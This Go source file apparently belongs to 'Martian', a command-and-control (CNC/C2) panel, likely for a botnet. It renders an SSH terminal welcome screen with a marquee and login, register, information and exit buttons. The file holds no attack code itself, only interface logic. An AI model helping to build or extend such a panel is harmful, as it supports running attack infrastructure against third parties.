package views

import (
	"GoEYE"
	"Martian/src/functions"
	"strings"
	"time"

	"golang.org/x/crypto/ssh"
)

// Welcomes the new founded connection onto Martian CNC
func NewWelcomedConnection(channel ssh.Channel, connection *ssh.ServerConn) error {

	// Adjusts the terminals connection window size
	if _, err := channel.Write([]byte("\033c" + "\033[8;30;80t" + "\033]0;Martian 2022\007")); err != nil {
		return err
	}

	// Allocated 50 ms for window resizing
	time.Sleep(50 * time.Millisecond)

	// Allocated a channel for closing goroutines
	cancel := make(chan struct{})

	// Runs the marquee for the marquee system at the bottom of the screen
	go functions.MarqueeText(channel, "\x1b[0m│", "Welcome to martian, FBs latest Zee an Zee", 29, 1, 78, 70, "\x1b[0m│", cancel)

	eye := GoEYE.GoEYE(channel, channel, GoEYE.DefaultStyle) // Creates our terminal style
	eye.MakeButton(true,  26, 3,  26, "LOGIN",    		"\x1b[48;5;10m\x1b[38;5;16m",  	"\x1b[0m", GoEYE.DefaultStyle) // Login button
	eye.MakeButton(true,  26, 29, 52, "REGISTER", 	    "\x1b[48;5;11m\x1b[38;5;16m", 	"\x1b[0m", GoEYE.DefaultStyle) // Register button
	eye.MakeButton(true,  26, 55, 78, "EXIT",     		"\x1b[48;5;9m\x1b[38;5;16m", 	"\x1b[0m", GoEYE.DefaultStyle) // Exit button
	eye.MakeButton(true,  23, 29, 52, "INFORMATION",    "\x1b[48;5;11m\x1b[38;5;16m", 	"\x1b[0m", GoEYE.DefaultStyle) // Exit button
	eye.MakeButton(false, 1,  3,  11, "Martian",		"", 	 		  	            "",    	   GoEYE.DefaultStyle)

	// Makes the box with the position
	if err := eye.Init(80, 80); err != nil {
		return err
	}

	// Writes the marquee system for the element
	channel.Write([]byte("\033[28;0f├"+ strings.Repeat("─", 78)+"┤"))
	channel.Write([]byte("\033[0;3f \x1b[4mMartian\x1b[0m "))

	// Channel for feteching the information
	str := make(chan *GoEYE.Event)

	// Runs the mouse cursor event
	go eye.WaitEvent(str, cancel) 

	for {
		button := <-str // Fetchs the method from the homePage

		// Only allows for valid cursor clicking on the home page buttons
		if button.Type != GoEYE.LeftClick && button.Type != GoEYE.RightClick {
			continue
		}


		// Controls our different routes for each button
		switch button.ButtonOccured.Label {


		case "Martian": // Home function
			cancel <- struct{}{}
			return NewWelcomedConnection(channel, connection)

		case "EXIT": // exit button
			cancel <- struct{}{}
			return channel.Close()
		case "LOGIN":
			cancel <- struct{}{}
			return NewLoginConnection(channel, connection)

		case "REGISTER":
			cancel <- struct{}{}
			return NewRegisterConnection(channel, connection)

		case "INFORMATION": // information page
			cancel <- struct{}{}
			return NewInformationPage(channel, connection)
		}
	}

}